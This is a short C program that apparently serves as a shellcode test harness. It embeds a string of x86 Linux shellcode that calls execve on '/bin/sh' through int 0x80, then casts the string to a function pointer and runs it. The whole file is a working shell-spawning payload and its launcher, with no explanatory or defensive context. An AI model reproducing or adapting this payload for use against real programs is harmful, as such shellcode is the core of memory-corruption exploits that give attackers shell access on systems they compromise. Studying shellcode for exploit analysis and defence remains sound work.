#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\xeb\x09\x5b\x31\xc9\xf7\xe1\xb0\x0b\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}
